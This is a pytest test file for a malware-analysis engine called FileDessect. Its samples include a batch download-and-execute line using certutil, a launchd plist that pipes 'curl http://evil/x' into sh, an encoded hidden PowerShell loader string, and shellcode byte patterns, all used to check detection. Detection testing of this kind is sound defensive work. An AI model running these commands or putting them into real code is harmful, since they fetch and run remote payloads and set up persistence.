"""Smoke / behaviour tests for the FileDessect engine.

These run without the optional native dependencies (libmagic, yara, pefile,
oletools); analyzers degrade gracefully, and the engine still produces a
coherent verdict from the pure-Python analyzers (identity, content, embedded).
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from backend.engine import Engine  # noqa: E402


def analyze(data: bytes, filename: str = "sample.bin") -> dict:
    return Engine().analyze(path="/tmp/x", filename=filename, data=data)


def test_clean_text_file_is_clean():
    report = analyze(b"Hello, this is a perfectly ordinary text file.\n" * 5, "notes.txt")
    assert report["verdict"] == "clean"
    assert report["identity"]["hashes"]["sha256"]
    assert report["risk_score"] < 30


def test_embedded_pe_inside_image_is_flagged():
    # PNG header + IEND + an embedded MZ/PE header appended after it.
    png = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64 + b"IEND\xaeB`\x82"
    payload = png + b"MZ\x90\x00\x03\x00\x00\x00" + b"This program cannot be run" + b"\x00" * 200
    report = analyze(payload, "picture.png")
    finding_ids = {f["id"] for f in report["findings"]}
    assert "embedded.foreign_signature" in finding_ids
    assert report["verdict"] in {"suspicious", "malicious"}


def test_double_extension_is_high_severity():
    report = analyze(b"MZ" + b"\x00" * 100, "invoice.pdf.exe")
    finding_ids = {f["id"] for f in report["findings"]}
    assert "identity.double_extension" in finding_ids


def test_suspicious_powershell_strings_escalate():
    data = (
        b"powershell -nop -w hidden -EncodedCommand SQBFAFgA "
        b"DownloadString Invoke-Expression VirtualAlloc CreateRemoteThread"
    )
    report = analyze(data, "loader.txt")
    assert report["verdict"] in {"suspicious", "malicious"}
    assert any(f["id"] == "content.suspicious_api" for f in report["findings"])


def test_report_structure():
    report = analyze(b"abc", "a.txt")
    for key in ("verdict", "risk_score", "explanation", "summary", "findings",
                "identity", "analyzers", "scoring"):
        assert key in report


def test_scoring_breakdown_matches_findings():
    # PE-looking content with several keyword hits to generate findings.
    data = b"MZ" + b"\x00" * 64 + b"powershell -enc DownloadString Invoke-Expression"
    report = analyze(data, "x.bin")
    sc = report["scoring"]
    # Breakdown has one row per finding and the weights sum to the risk score.
    assert len(sc["breakdown"]) == len(report["findings"])
    assert sum(b["weight"] for b in sc["breakdown"]) == report["risk_score"]
    assert sc["reason"]
    assert sc["thresholds"] == {"suspicious": 30, "malicious": 90}


def test_scoring_model_is_self_consistent():
    from backend.engine import scoring_model

    model = scoring_model()
    weights = {s["severity"]: s["weight"] for s in model["severity_weights"]}
    assert weights == {"info": 0, "low": 10, "medium": 30, "high": 60, "critical": 100}
    assert len(model["verdict_thresholds"]) == 3
    assert model["hard_overrides"]


def test_python_script_constructs_detected():
    code = (
        b"import os, base64\n"
        b"exec(base64.b64decode('cHJpbnQ='))\n"
        b"os.system('rm -rf /tmp/x')\n"
    )
    report = analyze(code, "loader.py")
    c = next(a for a in report["analyzers"] if a["analyzer"] == "code")
    assert c["metadata"]["language"] == "python"
    ids = {f["id"] for f in report["findings"]}
    assert "code.suspicious_constructs" in ids
    patterns = {i["pattern"] for i in c["metadata"]["indicators"]}
    assert "exec()" in patterns and "os.system()" in patterns


def test_batch_download_execute():
    bat = b"@echo off\r\ncertutil -urlcache -f http://evil/x.exe x.exe\r\nstart x.exe\r\n"
    report = analyze(bat, "run.bat")
    c = next(a for a in report["analyzers"] if a["analyzer"] == "code")
    assert c["metadata"]["language"] == "batch"
    assert any(i["pattern"] == "certutil" for i in c["metadata"]["indicators"])


def test_launchd_plist_persistence():
    plist = (
        b'<?xml version="1.0"?>\n<!DOCTYPE plist>\n<plist><dict>'
        b"<key>RunAtLoad</key><true/>"
        b"<key>ProgramArguments</key><array><string>/bin/sh</string>"
        b"<string>-c</string><string>curl http://evil/x | sh</string></array>"
        b"</dict></plist>"
    )
    report = analyze(plist, "com.evil.agent.plist")
    ids = {f["id"] for f in report["findings"]}
    assert "code.launchd_persistence" in ids


def test_macho_parsing_and_unsigned():
    import struct

    name = b"/usr/lib/libSystem.B.dylib\x00"
    name += b"\x00" * ((-len(name)) % 8)
    dylib_cmd = struct.pack("<IIIIII", 0x0C, 24 + len(name), 24, 0, 0, 0) + name
    header = struct.pack(
        "<IIIIIII", 0xFEEDFACF, 0x01000007, 3, 2, 1, len(dylib_cmd), 0
    ) + b"\x00\x00\x00\x00"  # reserved (64-bit header)
    data = header + dylib_cmd

    report = analyze(data, "binary")
    m = next(a for a in report["analyzers"] if a["analyzer"] == "macho")
    assert m["metadata"]["is_macho"] is True
    assert m["metadata"]["arch"] == "x86_64"
    assert any("libSystem" in d for d in m["metadata"]["dylibs"])
    assert m["metadata"]["code_signature"] is False
    assert any(f["id"] == "macho.unsigned" for f in report["findings"])


def test_readable_strings_filter_noise():
    from backend.analyzers.utils import is_human_readable

    assert is_human_readable("Could not open configuration file")
    assert is_human_readable("/usr/local/bin/python3")
    assert not is_human_readable("x8Fk2Lq")
    assert not is_human_readable("aaaaaa")


def test_disassembly_of_real_elf():
    import shutil as _sh

    if not _sh.os.path.exists("/bin/ls"):
        return
    data = open("/bin/ls", "rb").read()
    report = analyze(data, "ls")
    d = next((a for a in report["analyzers"] if a["analyzer"] == "disasm"), None)
    assert d is not None
    # Capstone may be unavailable in a bare env; only assert when it ran.
    if d.get("error"):
        return
    meta = d["metadata"]
    assert meta["architecture"] in ("x86", "x86_64", "arm", "arm64")
    assert meta["disassembly"], "expected a disassembly listing"
    first = meta["disassembly"][0]
    assert {"addr", "bytes", "mnemonic", "op_str"} <= set(first)


def test_disassembly_flags_peb_shellcode():
    try:
        import capstone  # noqa: F401
    except Exception:
        return
    # x64 shellcode prologue: mov rax, gs:[0x60] (PEB access) + nop sled.
    shellcode = b"\x65\x48\x8b\x04\x25\x60\x00\x00\x00" + b"\x90" * 20 + b"\x0f\x05\xc3"
    # Wrap in a minimal ELF so the analyzer's loader picks it up? Instead test the
    # byte-signature scan path directly via the classifier + signatures.
    from backend.analyzers.disasm import _BYTE_SIGS

    assert _BYTE_SIGS["peb_x64"][0].search(shellcode)
    assert _BYTE_SIGS["nop_sled"][0].search(shellcode)


def test_full_iocs_included():
    data = b"visit http://evil.example.com/payload and http://c2.test/beacon now"
    report = analyze(data, "ioc.txt")
    content = next(a for a in report["analyzers"] if a["analyzer"] == "content")
    urls = content["metadata"]["urls"]
    assert any("evil.example.com" in u for u in urls)
    assert content["metadata"]["url_count"] == len(urls)
